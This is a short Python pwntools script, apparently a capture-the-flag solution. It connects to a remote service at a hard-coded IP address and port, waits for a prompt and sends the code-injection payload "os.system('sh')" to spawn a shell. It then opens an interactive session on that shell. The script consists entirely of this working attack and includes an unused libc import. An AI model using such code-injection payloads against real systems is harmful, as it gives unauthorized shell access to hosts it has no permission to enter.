
from pwn import *
from ctypes import *

io = remote("111.200.241.244",58024)

libc = cdll.LoadLibrary("libc.so.6")
io.recvuntil('>')
payload = "os.system('sh')"
io.sendline(payload)
io.interactive()

